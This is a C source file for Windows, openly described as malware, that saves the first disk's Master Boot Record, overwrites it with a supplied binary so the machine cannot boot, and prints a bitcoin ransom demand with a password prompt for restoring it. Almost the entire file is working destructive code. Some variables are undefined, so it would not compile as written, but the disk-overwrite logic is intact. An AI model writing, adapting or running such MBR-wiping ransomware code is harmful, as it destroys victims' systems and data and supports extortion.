#include <windows.h>
#include <conio.h>
#include <stdio.h>
#define BLOCK_SIZE 512
/**
    Malware program that overwrites the MBR.
    Overwriting the MBR will make the host machine unable to boot the OS.

    @author: Florea Vlad

*/




/**ReadSect - We use this function to read a sector from the disk
    Param: _dsk - The disk we read from, usually, physicalDrive0
            _buff - Store Buffer- has to be allocated
            _nsect - Sector Number - each sector has 512 bytes. MBR is number 0 
*/
short ReadSect (const char *_dsk,char *&_buff,unsigned int _nsect){
  DWORD dwRead;   
  //Trying to get a handle on the disk
  HANDLE hDisk=CreateFile(_dsk,GENERIC_READ,FILE_SHARE_VALID_FLAGS,0,OPEN_EXISTING,0,0);
  if(hDisk==INVALID_HANDLE_VALUE) 
    {  
       CloseHandle(hDisk);
       printf("Couldn't Coppy MBR\n");
       return 1;
    }

    //Read the n-th sector
  SetFilePointer(hDisk,_nsect*512,0,FILE_BEGIN); 
  ReadFile(hDisk,_buff,512,&dwRead,0); 
  CloseHandle(hDisk);
  return 0;
}


/**ReadMBR()
    We use this function to read and store the machines MBR.
*/
char* readMBR(){
    char *dsk="\\\\.\\PhysicalDrive0";
    //Sector 0 = first 512 bytes = MBR
    int sector=0;

    char *buff=new char[BLOCK_SIZE];
    ReadSect(dsk,buff,sector);

    return buff;
}

/** overWriteMBR() 
    We use this function to overwrite the MBR.
    We need administrator privileges.
    @args: pathToBin - the path to the binary that contains the new MBR. 

*/
void overWriteMBR(char* pathToBin){
    DWORD dw;
    //Any storing device can be bootable, we can also overwrite the MBR of a USB-stick.
    //Get a handle on the SSD/HDD, asuming there's only one/ the first one is bootable.
    HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive != INVALID_HANDLE_VALUE){
        //Get a handle on the binary file
        HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0); 
        if (binary != INVALID_HANDLE_VALUE){
            //Get the size of the bin file. SHOULD BE LOWER THAN 510!
            DWORD size = GetFileSize(binary, 0);
            if (size > 0){
                byte *mbr = new byte[size]; 
                if (ReadFile(binary, mbr, BLOCK_SIZE, &dw, 0)){ 
                    printf("Binary file successfuly read!\n");
                    //OverWrite The MBR
                    if (WriteFile(drive, mbr, size, &dw, 0)){
                        printf("First sector overritten successfuly!\n");
                    }
                    else
                        printf("Fatal error! Can't override 1st sector!\n");
                }
                else
                    printf("Error reading from binary file!\n");
            }
            else
                printf("Invalid binary file!\n");
        }
        else{
            printf("Can't find the binary file to read from!\n");
        }
        CloseHandle(binary);
    }
    else
        printf("Administrator privileges required!\n");
    CloseHandle(drive);
}
/**
    RestoreMbr()
    We use this function to restore back the MBR.
    @args: localMBR - Original MBR.

*/

void restoreMBR(char* localMBR){

    DWORD dw;
    HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive != INVALID_HANDLE_VALUE){
        byte *mbr = new byte[BLOCK_SIZE]; 
            //Coppy the content of the original MBR in the mbr buffer. byte  = unsigned char.
            memcpy(mbr,localMBR,BLOCK_SIZE);
            //Overwriting the MBR
            if (WriteFile(drive, mbr, size, &dw, 0)){
                printf("First sector restored successfuly!\n"); 
            }
            else
                printf("Fatal error! Can't override 1st sector!\n");
    }
    else
        printf("Administrator privileges required!\n");
    
    CloseHandle(drive);
}

/**
    Main method
    Saves the actual MBR.
    Overwrites the MBR.
    Awaits for user input.
    optional: Restore the MBR
    exit.
*/
int main(){
    
    //Read The mbr
    char* localMBR = readMBR();
    
    //Overwrite the mbr
    overWriteMBR("data.bin");

    printf("Your MBR has been overwritten with a snake game\n");
    printf("Pay 10000000 $$ in bitcoin to MasterHacker200 in order to get your MBR back\n");
    printf("After your payment you will receive a password\n");
    printf("Closing this program will cause you to lose all your files!");
    int passVal= 500;
    int input =0;
    int count = 3;
    while(count != 0){
        printf("You have %d attempts left\n",count);
        printf("Enter pass number (Correct Password is 500): \n");
        scanf("%d",&input);
        if(input == pass){
            printf("Well done....trying to restore your MBR! fingers crossed\n");
            //Restore the MBR
            restoreMBR(localMBR);
            _getch();
            return 0;
        }
        count--;
    }
    printf(" :( Enjoy playing snake :(\n");
     _getch();

 return 0;   
}